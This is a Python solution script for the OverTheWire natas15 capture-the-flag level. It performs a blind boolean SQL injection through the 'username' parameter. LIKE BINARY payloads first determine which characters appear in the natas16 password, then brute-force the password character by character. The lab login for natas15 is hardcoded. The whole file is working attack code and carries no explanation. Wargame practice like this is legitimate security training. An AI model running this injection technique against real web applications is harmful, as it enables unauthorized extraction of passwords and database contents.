import requests, string

URL = 'http://natas15.natas.labs.overthewire.org'
AUTH = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

characters = string.ascii_letters + string.digits

# Find a valid character set based on SQL injection response
def find_valid_character_set():
    valid_set = []
    for char in characters:
        # Craft the SQL injection payload
        payload = f'natas16" AND password LIKE BINARY "%{char}%" #'
        
        # Send the request with the payload
        response = requests.get(URL, auth=AUTH, params={'username': payload})
        
        # Check if the response indicates a valid character
        if "This user exists." in response.text:
            valid_set.append(char)
            print(f"Found valid character: {char}")
    return valid_set

# Brute-force the password using the valid character set
def brute_force_password(valid_characters):
    password = ""
    
    # Passwords are 32 characters long
    while len(password) < 32:
        for char in valid_characters:
            # Craft the SQL injection payload
            payload = f'natas16" AND password LIKE BINARY "{password + char}%" #'
            
            # Send the request with the payload
            response = requests.get(URL, auth=AUTH, params={'username': payload})
            
            # Check if the response indicates a correct guess
            if "This user exists." in response.text:
                password += char
                print(f"Current password: {password}")
                
    
    return password

def main():
    valid_characters = find_valid_character_set()
    print(f"Valid characters found: {''.join(valid_characters)}")
    password = brute_force_password(valid_characters)
    print(f"Brute-forced password: {password}")
    
    
if __name__ == "__main__":
    main()